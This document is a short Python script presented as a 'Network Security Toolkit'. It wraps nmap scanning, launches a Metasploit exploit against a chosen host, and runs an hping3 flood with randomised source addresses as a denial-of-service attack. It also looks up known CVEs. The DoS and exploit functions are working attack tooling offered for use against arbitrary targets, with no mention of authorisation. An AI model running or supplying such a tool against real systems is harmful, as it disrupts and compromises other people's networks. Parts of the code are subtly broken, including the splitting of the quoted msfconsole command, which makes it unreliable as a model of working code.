import argparse
import requests
import subprocess
import sys
import time

def scan_with_nmap(target, use_udp):
    scan_type = "-sU" if use_udp else "-sT"
    nmap_cmd = f"sudo nmap -Pn {scan_type} -sC -sV {target}"
    output = subprocess.check_output(nmap_cmd.split())
    print(output.decode())

def run_metasploit_exploit(target, exploit):
    metasploit_cmd = f"sudo msfconsole -x 'use {exploit}; set RHOST {target}; run;'"
    output = subprocess.check_output(metasploit_cmd.split())
    print(output.decode())

def gather_network_info(target):
    info_cmd = f"sudo nmap -A {target}"
    output = subprocess.check_output(info_cmd.split())
    print(output.decode())

def perform_dos_attack(target, packets, interval, port, use_udp):
    dos_cmd = f"sudo hping3 -c {packets} -i u{interval} -p {port} --rand-source {'-2' if use_udp else ''} --flood {target}"
    start_time = time.time()
    subprocess.run(dos_cmd.split())
    end_time = time.time()
    duration = end_time - start_time
    print(f"Finished DoS attack in {duration:.2f} seconds")

def get_known_cves(target):
    api_url = f"https://services.nvd.nist.gov/rest/json/cves/1.0?keyword={target}"
    try:
        response = requests.get(api_url)
        data = response.json()

        if "result" in data:
            cves = data["result"].get("CVE_Items", [])

            if len(cves) > 0:
                print(f"Found {len(cves)} known CVE(s) for {target}:")
                for cve in cves:
                    cve_id = cve["cve"]["CVE_data_meta"]["ID"]
                    print("- " + cve_id)
            else:
                print("No known CVEs found for the target.")
        else:
            print("Error: Unable to retrieve CVE information.")
    except requests.exceptions.RequestException as e:
        print("Error: Failed to connect to the NVD API.")

def main():
    parser = argparse.ArgumentParser(description="Network Security Toolkit")
    parser.add_argument("choice", choices=["1", "2", "3", "4", "5", "6"], help="Select an option (1-6)")
    parser.add_argument("-t", "--target", help="Target IP or hostname")
    parser.add_argument("-e", "--exploit", help="Exploit name")
    parser.add_argument("-p", "--packets", type=int, help="Number of packets to send (for DoS attack)")
    parser.add_argument("-i", "--interval", type=float, default=0.1, help="Interval between packets in seconds (for DoS attack)")
    parser.add_argument("--port", type=int, default=0, help="Destination port for DoS attack (0 for random)")
    parser.add_argument("-u", "--udp", action="store_true", help="Use UDP instead of TCP for Nmap scan")
    args = parser.parse_args()

    if args.choice == "1":
        if not args.target:
            parser.error("Please provide the target IP or hostname.")
        scan_with_nmap(args.target, args.udp)
    elif args.choice == "2":
        if not args.target or not args.exploit:
            parser.error("Please provide both the target IP or hostname and the exploit name.")
        run_metasploit_exploit(args.target, args.exploit)
    elif args.choice == "3":
        if not args.target:
            parser.error("Please provide the target IP or hostname.")
        gather_network_info(args.target)
    elif args.choice == "4":
        if not args.target or not args.packets:
            parser.error("Please provide both the target IP or hostname and the number of packets.")
        perform_dos_attack(args.target, args.packets, args.interval, args.port, args.udp)
    elif args.choice == "5":
        if not args.target:
            parser.error("Please provide the target IP or hostname.")
        get_known_cves(args.target)
    elif args.choice == "6":
        print("Goodbye!")
        sys.exit(0)

if __name__ == "__main__":
    main()
